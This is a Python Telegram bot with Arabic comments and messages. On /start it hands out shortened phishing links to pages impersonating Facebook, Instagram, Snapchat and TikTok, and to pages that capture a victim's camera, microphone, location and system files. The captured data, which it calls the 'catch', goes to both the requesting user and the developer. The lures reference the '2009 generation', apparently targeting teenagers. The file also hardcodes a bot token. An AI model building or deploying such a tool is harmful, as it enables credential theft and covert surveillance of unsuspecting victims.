import telebot
import requests
from flask import Flask
from threading import Thread
import os
import logging
import time

# إعدادات السيرفر لمنع التوقف
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask('')
@app.route('/')
def home():
    return "M.Y.9 Dual-Route System Online"

def run():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- إعدادات البوت ---
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
MY_ID = '7238206121' # هاد الآي دي تبعك يا أبو سند عشان يوصلك نسخة من كل شي
bot = telebot.TeleBot(TOKEN)

# تنظيف الاتصال وحل مشكلة 409
bot.remove_webhook()
time.sleep(1)

def short_link(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return res.text if res.status_code == 200 else url
    except:
        return url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    uid = message.chat.id
    first_name = message.from_user.first_name
    hunter = first_name.replace(" ", "_")
    
    # رابط الـ GitHub Pages
    base = "https://m-y-9-tech.github.io/fb/" 
    
    # قائمة الروابط الـ 8 المجهزة لجيل 2009
    links = {
        "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
        "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
        "snap": short_link(f"{base}snap.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
        "tik": short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
        "cam": short_link(f"{base}cam.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
        "mic": short_link(f"{base}mic.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
        "sys": short_link(f"{base}sys.html?id={uid}&hunter={hunter}&dev={MY_ID}")
    }

    msg = f"""
نـ^ـظـ^ـام M.Y.9 الـمـزدوج | أهلاً بك {first_name}

👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

⚠️ تـنـبـيـه: الـصـيـد يـصـل إلـيـك وإلـى الـمـطـور تـلـقـائـيـاً.

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💎 روابـط جـيـل 2009 الـمـفـعـلـة 💎
▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 فيـسـبوك (قرارات) 🔐: `{links['fb']}`

🔹 انـستـقرام (توقعات) 🛡️: `{links['ig']}`

🔹 سـنـاب (المحذوف) 👻: `{links['snap']}`

🔹 تـيـك تـوك (تسريب) 🎵: `{links['tik']}`

🔹 الكـامـيرا (مراقبة) 📸: `{links['cam']}`

🔹 الـمـايك (تسجيل) 🎤: `{links['mic']}`

🔹 الـمـوقع (القاعات) 📍: `{links['loc']}`

🔹 الـنـظام (ملفات) 📱: `{links['sys']}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ Status: Connected
    """
    bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
